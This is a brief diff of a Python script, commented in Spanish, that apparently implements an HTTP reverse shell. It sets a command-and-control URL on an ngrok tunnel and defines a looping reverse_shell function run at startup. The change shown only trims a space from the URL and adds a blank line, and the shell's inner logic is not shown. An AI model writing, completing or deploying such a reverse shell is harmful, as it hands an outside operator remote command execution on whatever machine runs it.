@@ -2,7 +2,7 @@ import requests
 import subprocess
 
 # Configuración del servidor HTTP (ngrok)
-URL = "https://8025-167-60-62-81.ngrok-free.app "  # Tu URL de ngrok
+URL = "https://8025-167-60-62-81.ngrok-free.app"  # Tu URL de ngrok
 
 def reverse_shell():
     while True:
@@ -29,4 +29,5 @@ def reverse_shell():
 
 if __name__ == "__main__":
     reverse_shell()
+
 
